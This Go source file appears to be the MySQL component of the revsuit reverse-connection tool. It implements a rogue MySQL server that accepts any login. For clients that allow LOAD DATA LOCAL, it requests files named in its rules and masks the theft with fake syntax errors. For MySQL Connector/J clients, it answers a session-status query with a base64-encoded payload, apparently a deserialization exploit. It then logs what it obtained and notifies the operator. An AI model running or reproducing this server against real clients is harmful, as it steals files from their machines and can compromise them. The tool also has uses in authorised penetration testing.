package mysql

import (
	"encoding/base64"
	"fmt"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/li4n0/revsuit/internal/database"
	"github.com/li4n0/revsuit/internal/file"
	"github.com/li4n0/revsuit/internal/ipinfo"
	"github.com/li4n0/revsuit/pkg/mysql/vmysql"
	"github.com/pkg/errors"
	log "unknwon.dev/clog/v2"
	"vitess.io/vitess/go/sqltypes"
)

var (
	server             *Server
	once               sync.Once
	mysqlConnectorFlag = regexp.MustCompile(`mysql-connector-java(-\d+\.\d+\.\d+)?`)
)

type Server struct {
	Config
	rules      []*Rule
	rulesLock  sync.RWMutex
	livingLock sync.Mutex

	listener *vmysql.Listener
	Handler  vmysql.Handler

	connRulePool sync.Map
}

func GetServer() *Server {
	once.Do(func() {
		server = &Server{rulesLock: sync.RWMutex{}, livingLock: sync.Mutex{}}
	})
	return server
}

func (s *Server) getRules() []*Rule {
	defer s.rulesLock.RUnlock()
	s.rulesLock.RLock()
	return s.rules
}

func (s *Server) UpdateRules() error {
	db := database.DB.Model(new(Rule))
	defer s.rulesLock.Unlock()
	s.rulesLock.Lock()
	return errors.Wrap(db.Order("base_rank desc").Find(&s.rules).Error, "MySQL update rules error")
}

// NewConnection is part of the mysql.Handler interface.
func (s *Server) NewConnection(c *vmysql.Conn) {
	log.Trace("New MySQL connection from addr [%s] logged [%s] in with username [%s], ID [%d]", c.RemoteAddr(), c.SchemaName, c.User, c.ConnectionID)

	if err := c.Conn.SetDeadline(time.Now().Add(time.Second * 30)); err != nil {
		log.Warn("MySQL set connection deadline error:%v", err)
	}

	c.RecycleReadPacket()
	var (
		user      = c.User
		schema    = c.SchemaName
		validated bool
	)

	for _, _rule := range s.getRules() {
		flag, flagGroup, vars := _rule.Match(user)
		if flag == "" {
			flag, _, _ = _rule.Match(schema)
		}
		if flag == "" {
			continue
		}
		log.Trace("MySQL connection[id: %d] matched rule[rule_name: %s, flag: %s]", c.ConnectionID, _rule.Name, flag)
		s.connRulePool.Store(c.ConnectionID, _rule)
		validated = true
		c.Flag = flag
		c.FlagGroup = flagGroup
		c.Vars = vars
		break
	}
	if !validated {
		c.WriteErrorResponse(vmysql.NewSQLError(vmysql.ERAccessDeniedError, vmysql.SSAccessDeniedError, "Access denied for user '%v'", c.User).Error())
		return
	}
	if c.ConnAttrs != nil {
		if strings.Contains(c.ConnAttrs["_client_name"], "MySQL Connector") {
			c.IsJdbcClient = true
			c.SupportLoadDataLocal = true
		}
	}
}

// ConnectionClosed is part of the mysql.Handler interface.
func (s *Server) ConnectionClosed(c *vmysql.Conn) {
	log.Trace("MySQL Client leaved, ID [%d]", c.ConnectionID)

	var clientName, clientOS, flag, flagGroup string

	user := c.User
	schema := c.SchemaName
	supportLoadLocalData := c.SupportLoadDataLocal

	cr, ok := s.connRulePool.Load(c.ConnectionID)
	if !ok {
		return
	}

	_rule := cr.(*Rule)

	if c.ConnAttrs != nil {
		clientName = c.ConnAttrs["_client_name"] + " " + c.ConnAttrs["_client_version"]
		clientOS = c.ConnAttrs["_os"] + " " + c.ConnAttrs["_platform"]
	}

	ip := strings.Split(c.RemoteAddr().String(), ":")[0]

	filenames := strings.Split(_rule.Files, ",")
	files := make([]file.MySQLFile, 0)
	for _, filename := range filenames {
		if len(c.Files[filename]) != 0 {
			files = append(files, file.MySQLFile{Name: filename, Content: c.Files[filename]})
		}
	}

	r, err := newRecord(_rule, flag, user, schema, clientName, clientOS, ip, ipinfo.Area(ip), supportLoadLocalData, files)
	if err != nil {
		log.Warn("MySQL record[rule_id: %s] created failed: %s", _rule.Name, err)
		return
	}
	log.Info("MySQL record[id:%d rule:%s remote_ip:%s] has been created", r.ID, _rule.Name, ip)

	//only send to client or notify user when this connection recorded first time.
	var count int64
	if c.FlagGroup != "" {
		database.DB.Where("rule_name=? and (user like ? or schema like ?)", _rule.Name, "%"+flagGroup+"%", "%"+flagGroup+"%").Model(&Record{}).Count(&count)
	}
	if count <= 1 {
		if _rule.PushToClient {
			r.PushToClient()
			if flagGroup != "" {
				log.Trace("MySQL record[id:%d, flagGroup:%s] has been put to client message queue", r.ID, flagGroup)
			} else {
				log.Trace("MySQL record[id:%d] has been put to client message queue", r.ID)
			}
		}
		//send notice
		if _rule.Notice {
			go func() {
				r.Notice()
				if flagGroup != "" {
					log.Trace("MySQL record[id:%d, flagGroup:%s] notice has been sent", r.ID, flagGroup)
				} else {
					log.Trace("MySQL record[id: %d] notice has been sent", r.ID)
				}
			}()
		}
	}

	s.connRulePool.Delete(c.ConnectionID)
}

// ComQuery is part of the mysql.Handler interface.
func (s *Server) ComQuery(c *vmysql.Conn, query string, callback func(*sqltypes.Result) error) error {
	log.Trace("MySQL Client from addr, ID [%d] try to query [%s]", c.ConnectionID, query)

	// match mysql-connector-java
	if strings.Contains(query, "mysql-connector-java") && (c.ConnAttrs == nil || c.ConnAttrs["_client_name"] == "") {
		c.ConnAttrs = map[string]string{"_client_name": mysqlConnectorFlag.FindString(query)}
	}

	cr, ok := s.connRulePool.Load(c.ConnectionID)
	if !ok {
		c.WriteErrorResponse(
			fmt.Sprintf(
				"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '%s' at line 1",
				strings.ReplaceAll(
					strings.ReplaceAll(query, "%", "%%"),
					"'", "\\'"),
			),
		)
		return nil
	}
	_rule := cr.(*Rule)

	if _rule.ExploitJdbcClient && _rule.Payloads != nil && c.IsJdbcClient {
		if query == "SHOW SESSION STATUS" {
			var payload []byte

			log.Trace("MySQL Client [%d] request `%s`, start exploiting...", c.ConnectionID, query)
			r := &sqltypes.Result{Fields: vmysql.SchemaToFields(vmysql.Schema{
				{Name: "Variable_name", Type: sqltypes.Blob, Nullable: false},
				{Name: "Value", Type: sqltypes.Blob, Nullable: false},
			})}

			//choose payload
			if c.Vars["payload"] != "" && _rule.Payloads[c.Vars["payload"]] != "" {
				payload, _ = base64.StdEncoding.DecodeString(_rule.Payloads[c.Vars["payload"]])
				log.Trace("MySQL exploit client [%d] with payload [%s]", c.ConnectionID, c.Vars["payload"])
			} else {
				for k, v := range _rule.Payloads {
					payload, _ = base64.StdEncoding.DecodeString(v)
					log.Trace("MySQL not found payload variable, exploit client [%d] with payload [%s]", c.ConnectionID, k)
					break
				}
			}
			r.Rows = append(r.Rows, vmysql.RowToSQL(vmysql.SQLRow{[]byte{}, payload}))
			_ = callback(r)
		} else {
			r := vmysql.GetMysqlVars()
			_ = callback(r)
		}
		return nil
	}

	// mysql LOAD DATA LOCAL
	if !c.SupportLoadDataLocal {
		log.Trace("MySQL Client not support LOAD DATA LOCAL, return error directly")
		c.WriteErrorResponse(
			fmt.Sprintf(
				"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '%s' at line 1",
				strings.ReplaceAll(
					strings.ReplaceAll(query, "%", "%%"),
					"'", "\\'"),
			),
		)
		return nil
	}

	files := strings.Split(_rule.Files, ",")
	if c.Files == nil {
		c.Files = make(map[string][]byte)
	}
	for _, filename := range files {
		if c.Files[filename] == nil {
			log.Trace("MySQL now try to read file [%s], ID [%d]", filename, c.ConnectionID)
			data := c.RequestFile(filename)
			if len(data) == 0 {
				log.Trace("MySQL file [%s] read failed, file may not exist in client [%d]", filename, c.ConnectionID)
				c.Files[filename] = []byte{}
			} else {
				c.Files[filename] = data
			}
		}
	}

	c.WriteErrorResponse(fmt.Sprintf(
		"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '%s' at line 1",
		strings.ReplaceAll(
			strings.ReplaceAll(query, "%", "%%"),
			"'", "\\'"),
	))

	return nil
}

// WarningCount is part of the mysql.Handler interface.
func (s *Server) WarningCount(c *vmysql.Conn) uint16 {
	return 0
}

func (s *Server) Stop() {
	log.Info("MySQL Server is stopping...")
	s.Enable = false
	s.livingLock.Unlock()
}

func (s *Server) Restart() {
	s.Stop()
	time.Sleep(time.Second * 2)
	go s.Run()
}

func (s *Server) Run() {
	s.Enable = true
	s.livingLock.Lock()
	defer func() {
		if s.Enable {
			log.Error("MySQL Server exited unexpectedly")
			s.Enable = false
			s.livingLock.Unlock()
		}
	}()
	if err := s.UpdateRules(); err != nil {
		log.Error(err.Error())
		return
	}

	s.Handler = s

	var authServer = &vmysql.AuthServerNone{}
	var err error

	log.Info("Starting MySQL Server at %s", s.Addr)
	s.listener, err = vmysql.NewListener("tcp", s.Addr, authServer, s, s.VersionString, 0, 0)
	if err != nil {
		log.Error("New MySQL Server failed: %s", err)
		return
	}

	go func() {
		s.livingLock.Lock()
		if !s.Enable {
			s.listener.Close()
		}
		s.livingLock.Unlock()
	}()

	s.listener.Accept()
}
